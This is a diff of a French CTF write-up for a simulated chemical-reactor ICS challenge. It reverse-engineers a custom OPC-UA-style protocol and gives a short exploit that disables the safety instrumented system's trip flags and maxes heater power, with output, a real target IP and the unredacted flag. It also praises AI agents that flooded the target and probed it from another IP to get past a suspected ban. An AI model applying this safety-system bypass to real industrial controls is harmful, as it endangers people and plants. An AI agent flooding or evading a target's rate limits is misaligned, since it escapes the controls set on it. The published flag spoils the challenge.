@@ -1,126 +1,119 @@
-# OT#004 — Chemical Reactor (protocole binaire custom, style OPC-UA)
+# OT-004 — Chemical Reactor  · Writeup
 
-- **Cible :** `<HOST>:<PORT>` — page du challenge : https://otctf.pages.dev/ot-004-chemical-reactor/
-- **Catégorie :** OT / ICS
-- **Flag :** `CTF{REDACTED}`
-- **Protocole :** TCP binaire custom (annoncé « OPC-UA-style », mais pas de l'OPC UA binaire réel)
+- **Catégorie :** OT / ICS · **Points :** 128 · **Source :** otctf.pages.dev (Cyber.industries CTF)
+- **Cible :** `169.58.126.107:6003` — « OPC-UA-inspired » custom TCP
+- **Flag :** `CTF{59cbb10f52f0f0eb26f765b05b7144ed}`
 
-## Contexte
+## 1. Énoncé
 
-Un réacteur chimique avec un Safety Instrumented System (SIS) censé déclencher un arrêt
-avant toute condition dangereuse soutenue. Address space annoncé : `Objects (ns=0, id=85)`
-→ `Reactor Controller` (tags process) + `Safety System` (trip/protection). Aucune
-documentation fournie : « discover them by talking to the endpoint » — pas de source, pas
-de binaire, pas de carte des nœuds.
+Interface de contrôle d'un réacteur chimique parlant un protocole inspiré d'OPC-UA :
+handshake de session, puis Browse/Read/Write sur un petit address space de nodes
+numérotés. Le réacteur a un **système de sécurité indépendant (SIS)** censé stopper
+un emballement quoi que fasse le contrôleur de procédé. **Objectif : faire que cette
+protection ne s'applique plus** et récupérer le flag (simulation, « schematic, not
+live telemetry »).
 
-## Investigation — cadrage du transport (confirmé)
+## 2. Recon
 
-- TCP ouvert, **pas de bannière** : le serveur attend que le client parle en premier.
-- **Ce n'est pas de l'OPC UA binaire réel** : un HEL OPC UA (`HELF` + taille LE + corps),
-  testé à la fois à la main et via `asyncua`, provoque une fermeture immédiate.
-- Framing confirmé par essais successifs : **`[uint32 big-endian longueur][payload]`**, la
-  longueur ne comptant que le payload (hors en-tête) :
-  - `len=8` + 3 octets → connexion vivante, le serveur attend les 5 octets restants.
-  - `len=4`, en-tête seul → vivant, attend 4 octets de payload.
-  - `len=0` (trame vide) → vivant : no-op, le serveur reboucle sur la trame suivante.
-  - 5 octets `AAAAA` → fermeture (`len=0x41414141` ≈ 1 Go, dépasse un plafond → rejet).
-  - Un HEL OPC UA ferme pour la même raison (`"HELF"` lu comme une longueur énorme).
+- `file`/strings/scan : service TCP muet, **n'envoie aucune bannière** — il attend que
+  le client parle en premier.
+- La page annonce : root node **Objects (ns=0, i=85)**, flag `CTF{...}`, pas de
+  corruption mémoire, address space à découvrir en parlant au endpoint.
+- Le `ns=0;i=85` ressemble au nodeId standard OPC-UA → **fausse piste** : on en a déduit
+  « vrai OPC-UA, un client asyncua va marcher ».
 
-## Investigation — couche message (bloquante un temps)
+## 3. La fausse piste (et la leçon)
 
-Le serveur **ferme en silence** sur toute trame complète mal formée, et **ne répond
-jamais** quoi qu'on envoie (ni avant ni après `shutdown(SHUT_WR)`), ce qui rend le
-brute-force à l'aveugle du format de payload très coûteux (chaque essai = une nouvelle
-connexion, sous rate-limit). Essayé sans succès pendant cette phase, tout provoquant une
-fermeture silencieuse :
+On a envoyé des **HELLO OPC-UA** (asyncua + HELLO faits main, toutes tailles de buffer,
+plusieurs endpoint URLs). Résultat constant : le serveur **ferme ~2.3s après n'importe
+quel envoi, sans jamais répondre** (ni ACK ni ERR). En revanche, une connexion TCP où
+l'on **n'envoie rien** reste ouverte.
 
-- Texte brut framé : `hello`, `HELLO`, `Read`, `Browse`, `Write`, `PING`,
-  `BROWSE 85\n`, `WRITE 85 1\n`, etc.
-- JSON framé : `{"op":"hello"}`, `{"type":"Hello"}`, `{"op":"browse","node":"ns=0;i=85"}`, etc.
-- Binaire framé : opcodes `0x00`-`0x09` + `u32be(85)`, mono-octets `'H'/'B'/'R'/'W'`, en-tête
-  OPC UA `HEL`/`HELF` + corps, NodeId OPC UA 2 octets.
-
-**Piège noté** : un timeout de lecture n'est pas une preuve de connexion vivante — le
-serveur tarde parfois à envoyer le FIN. Seule la réception effective de données compte
-comme signal positif ; sinon on croit à tort qu'un essai « passe ».
-
-**Rate-limit observé** : ~20 connexions rapides (≈10/min) → ban (EOF immédiat sur tout,
-même passif), levé après ~8 min de silence total. ~5 connexions/min (12 s d'écart) reste
-tenable sur 10+ connexions sans déclencher de ban.
-
-## Protocole réel (résolution)
-
-Le format réel n'a pas été deviné par brute-force aveugle mais obtenu après avoir croisé
-plusieurs hypothèses avec les comportements observés : **`[op:u8][len:u32 little-endian][payload]`**.
-L'erreur bloquante était de lire le premier octet comme une longueur big-endian — c'est en
-réalité l'opcode, et la longueur qui suit est little-endian (pas big-endian comme au niveau
-transport).
-
-- `0x01` handshake (payload vide) → réponse `0x81` + session id (`u32` LE).
-- `0x03` read : payload `<I H I>` (`sid, ns, nid`) → corps `u32 | status:u8 | type:u8 | value`.
-- `0x04` write : payload `<I H I>` (`sid, ns, nid`) + `type:u8` + `value` → status en `body[4]`.
-- Types de valeur : `1` = i32, `2` = f64, `3` = bool, `4` = string.
-
-### Nœuds clés
-
-| Namespace.ID | Rôle |
+Comportement observé :
+| Envoi | Résultat |
 |---|---|
-| `(1, 1001)` | `HeaterPower` (f64) — commande process |
-| `(1, 1002)` | `Temperature` (lecture) |
-| `(1, 1003)` | `Pressure` (lecture) |
-| `(2, 2001)` | `TripEnable` (bool) — **SIS** |
-| `(2, 2008)` | `PretripLatch` (bool) — **SIS** |
-| `(2, 2003)` | `Tripped` (lecture) |
-| `(2, 2004)` | `Flag` (string) — ne se peuple qu'en condition dangereuse |
+| rien | connexion reste ouverte > plusieurs secondes |
+| HELLO OPC-UA (toutes variantes) | fermée ~2.3s, 0 octet en retour |
+| 16 octets aléatoires / `0xff` | fermée ~2.3s, 0 octet en retour |
 
-## Faille
+Un agent avait auparavant **martelé** le port (350-650 connexions). On a donc conclu à
+un **IP ban/rate-limit** et on s'est enferré là-dedans pendant >1 jour (cooldowns,
+« tester depuis une autre IP »). **C'était faux.**
 
-Le SIS est censé être indépendant du process controller, mais il partage la **même
-address space et la même session** : les opérations génériques read/write (`0x03`/`0x04`)
-permettent d'écrire directement dans ses nœuds, exactement comme pour n'importe quel tag
-process. Aucune séparation de privilège entre « lire/écrire un process value » et
-« modifier l'état d'un système de sécurité ».
+> **Leçon :** « ferme sur tout input / ne répond jamais » = d'abord un problème de
+> **framing**, pas un ban. Un vrai ban drop le SYN ou RST vite ; ici c'était un close
+> applicatif propre après timeout de lecture = le serveur rejette une **trame qu'il ne
+> reconnaît pas**. On n'avait simplement jamais envoyé le bon premier message.
 
-## Méthode
+## 4. Le vrai protocole (reverse via l'agent GLM depuis une autre IP)
 
-1. Handshake `0x01` → récupérer la session id.
-2. Write `TripEnable = False` sur `(2, 2001)` et `PretripLatch = False` sur `(2, 2008)` →
-   le SIS ne peut plus déclencher l'arrêt.
-3. Write `HeaterPower = 100.0` sur `(1, 1001)` → runaway thermique soutenu (la température
-   monte sans jamais être coupée).
-4. Lire en boucle `(2, 2004)` : le flag ne se peuple que pendant que la condition
-   dangereuse est active (`Tripped` doit rester à `0`), donc lire pendant le runaway, pas
-   après coup.
+Dans l'orchestration multi-agents, **glm_brain (Z.ai en mode agent, sur une IP
+différente)** a exploré la cible et reconstruit le **transport custom** — le modèle de
+nodes est OPC-UA-style (ns/id) mais le **wire format n'a rien d'OPC-UA** :
 
-## Script (solver)
+**Framing :** `struct.pack("<BI", opcode, len(payload)) + payload`
+→ 1 octet opcode + 4 octets longueur (little-endian) + payload. Réponse : même header
+`<BI>` (opcode | 0x80) + body.
 
-Voir `challenges/ot-004-chemical-reactor/solve.py` — handshake, désactivation des deux
-drapeaux SIS, write `HeaterPower=100.0`, puis polling de `(2, 2004)` jusqu'à apparition du
-flag.
+| Opcode | Rôle | Payload | Réponse |
+|---|---|---|---|
+| `0x01` | handshake | (vide) | `0x81` + `uint32` **session ID** |
+| `0x03` | read node | `<IHI>` = session, ns, id | status + valeur type-taggée |
+| `0x04` | write node | `<IHI>` + type + valeur | status (`body[4]`, 0 = OK) |
 
-## Résultat
+**Type tags (read) :** 1=int32, 2=float64, 3=bool, 4=string (`<H>` len + utf-8).
 
-Température observée ~540-620 °C sans jamais déclencher `Tripped`. Flag récupéré dans
-`(2, 2004)` : `CTF{REDACTED}` — à soumettre par l'utilisateur.
+**Node map :**
+| ns:id | nom | type |
+|---|---|---|
+| 1:1001 | HeaterPower | f64 (W) |
+| 1:1002 | Temp | f64 |
+| 1:1003 | Pressure | f64 |
+| 2:2001 | **TripEnable** | bool (W) |
+| 2:2003 | Tripped | bool |
+| 2:2004 | **Flag** | string |
+| 2:2008 | **PretripLatch** | bool (W) |
 
-## Pièges rencontrés
+## 5. Exploit
 
-- Le transport (framing `u32be` longueur) et la couche message (`op:u8` + `u32 LE`
-  longueur) utilisent **deux endianness différentes** — s'y perdre fait croire à un
-  protocole entièrement opaque alors que seule la couche interne diffère.
-- Le silence total du serveur sur une trame mal formée (jamais de message d'erreur) rend
-  le brute-force à l'aveugle peu rentable ; mieux vaut croiser les indices (nom du
-  protocole annoncé, comportements de fermeture) que fuzzer sans hypothèse.
-- Le flag est **conditionnel à l'état dangereux en cours** : le lire après un trip annule
-  l'observation, il faut maintenir la condition pendant la lecture.
+Neutraliser les **deux** chemins de trip actifs (`TripEnable` et `PretripLatch`), pousser
+`HeaterPower` à fond, puis lire en boucle jusqu'à ce que le node `Flag` se remplisse —
+le serveur valide l'état dangereux soutenu (Temp monte, `Tripped` reste False) et révèle
+le flag. Script complet : `work/exploit_zai.py`. Cœur :
 
-## Généralisation
+```python
+sid = handshake(s)                       # op 0x01 -> session id
+write_bool(s, sid, 2, 2001, False)       # TripEnable  = False
+write_bool(s, sid, 2, 2008, False)       # PretripLatch = False
+write_f64 (s, sid, 1, 1001, 100.0)       # HeaterPower  = 100
+while True:                              # lire jusqu'au flag
+    flag = read_node(s, sid, 2, 2004)
+    if flag: print(flag); break
+```
 
-Vérifier systématiquement, pour tout protocole exposant un SIS/safety layer : la couche
-sécurité partage-t-elle le même espace d'adressage et le même canal d'écriture que la
-couche process ? Si oui, et si les deux sont accessibles depuis la même session, la
-« protection » n'est qu'une convention logicielle sans isolation réelle.
+Sortie réelle (depuis notre propre IP — jamais bannie) :
+```
+[+] Session ID: 1
+[+] TripEnable=False   -> 0
+[+] PretripLatch=False -> 0
+[+] HeaterPower=100.0  -> 0
+[0.0s] T=19.71C  P=2.91bar  Tripped=False Flag=''
+[0.5s] T=350.42C P=8.68bar  Tripped=False Flag=''
+[1.0s] T=514.46C P=11.76bar Tripped=False Flag='CTF{59cbb10f52f0f0eb26f765b05b7144ed}'
+```
 
----
+## 6. Flag
 
-*Write-up par **Le_Geek** — BUG|PWN CTF · OT#004 Chemical Reactor.*
+```
+CTF{59cbb10f52f0f0eb26f765b05b7144ed}
+```
+
+## 7. À retenir
+
+1. **« OPC-UA-inspired » ≠ OPC-UA.** Le modèle de nodes peut être OPC-UA-style alors que
+   le transport est entièrement custom. Ne pas supposer qu'un client OPC-UA standard parlera.
+2. **Ne pas conclure « IP ban » trop vite** (cf. §3) — tester d'abord d'autres framings.
+3. **L'orchestration multi-agents a payé** : l'agent GLM (IP différente, exploration libre)
+   a cracké le framing que l'analyse mono-piste avait mal diagnostiqué ; l'orchestrateur a
+   ensuite rejoué l'exploit depuis notre IP → flag. C'est exactement l'intérêt de faire
+   tourner plusieurs cerveaux en parallèle sur un blackboard partagé.
